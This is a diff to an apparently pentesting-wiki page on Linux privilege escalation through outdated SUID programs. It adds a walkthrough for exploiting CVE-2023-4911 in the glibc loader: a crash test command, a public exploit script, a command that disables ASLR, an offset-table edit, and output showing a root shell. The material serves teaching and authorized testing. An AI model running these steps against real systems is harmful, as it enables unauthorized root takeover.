@@ -6,7 +6,7 @@ description: >-
 
 # Outdated Versions
 
-## Default SUID binaries
+Default SUID binaries
 
 There are some common programs that require the SUID bit to work, like sudo. There is a lot of research into finding vulnerabilities in these programs specifically for Privilege Escalation. You can look up the version of a program with a term like "exploit" or "CVE" to find known exploits for it. [GitHub ](https://github.com/)and [ExploitDB](https://www.exploit-db.com/) are is great resources where Proof of Concepts are often shared, so make sure to search there if you know the program is vulnerable.&#x20;
 
@@ -44,11 +44,76 @@ If compilers like `gcc` are not available on the target, you could try the Pytho
 An exploit of PwnKit written in Python
 {% endembed %}
 
+### glibc `ld.so` > 2.34 (CVE-2023-4911)
+
+A vulnerability in the glibc loader was found, which is used in almost all SUID binaries. It can be triggered via environment variables, specifically `GLIBC_TUNABLES`. A simple proof-of-concept was made to test if the current version is vulnerable, which uses any SUID binary like `su`:
+
+{% code overflow="wrap" %}
+```bash
+env -i "GLIBC_TUNABLES=glibc.malloc.mxfast=glibc.malloc.mxfast=A" "Z=`printf '%08192x' 1`" /usr/bin/su --help
+```
+{% endcode %}
+
+{% code title="Vulnerable output" %}
+```
+Segmentation fault
+```
+{% endcode %}
+
+{% code title="Patched output" %}
+```
+Usage:
+ su [options] [-] [<user> [<argument>...]]
+...
+```
+{% endcode %}
+
+If you find that it is vulnerable, you can exploit it using one of the many scripts that were made. A useful one is the one made by [@bl4sty](https://twitter.com/bl4sty) which has 2 modes depending on **ASLR**:
+
+* **Disabled**: "Search offset" which will try offsets 128-1024 until a dummy payload triggers
+* **Enabled**: "Exploit" which uses a static offset to exploit it in a real environment
+
+{% embed url="https://haxx.in/files/gnu-acme.py" %}
+Proof of Concept with offset finder to get a root shell
+{% endembed %}
+
+Finding this offset is important because not all environments have the same one. A few common ones are included in the `TARGETS` variable in the Python script above. For consistent success on arbitrary systems, you should first _recreate the target environment_ and disable ASLR:
+
+<pre class="language-shell-session" data-title="Recreated environment"><code class="lang-shell-session"><strong>$ echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
+</strong><strong>$ python3 gnu-acme.py
+</strong>...
+found working offset for ld.so '4f536ac1cd2e8806aed8556ea7795c47404de8a9' -> 561
+found working offset for ld.so '4f536ac1cd2e8806aed8556ea7795c47404de8a9' -> 562
+found working offset for ld.so '4f536ac1cd2e8806aed8556ea7795c47404de8a9' -> 563
+</code></pre>
+
+Then use any of these working offsets with ASLR enabled to get a shell in a few minutes:
+
+{% code title="gnu-acme.py" %}
+```diff
+TARGETS = {
+    "69c048078b6c51fa8744f3d7cff3b0d9369ffd53": 561,
+...
+    "956d98a11b839e3392fa1b367b1e3fdfc3e662f6": 322,
++   "4f536ac1cd2e8806aed8556ea7795c47404de8a9": 561,
+}
+```
+{% endcode %}
+
+<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ python3 gnu-acme.py
+</strong>...
+[i] using stack addr 0x7ffe1010100c
+...................................................................................
+** ohh... looks like we got a shell? **
+<strong># id
+</strong>uid=0(root) gid=1001(user) groups=1001(user)
+</code></pre>
+
 ## Old Bash Tricks
 
 Bash is by far the most common shell, and has had a few updates to change certain features. In previous versions of bash, there were some tricks to exploit SUID binaries with functions and environment variables. To check the version of bash use:
 
-<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ /bin/bash --version
+<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ bash --version
 </strong>GNU bash, version 4.1.5(1)-release (x86_64-pc-linux-gnu)
 </code></pre>
 
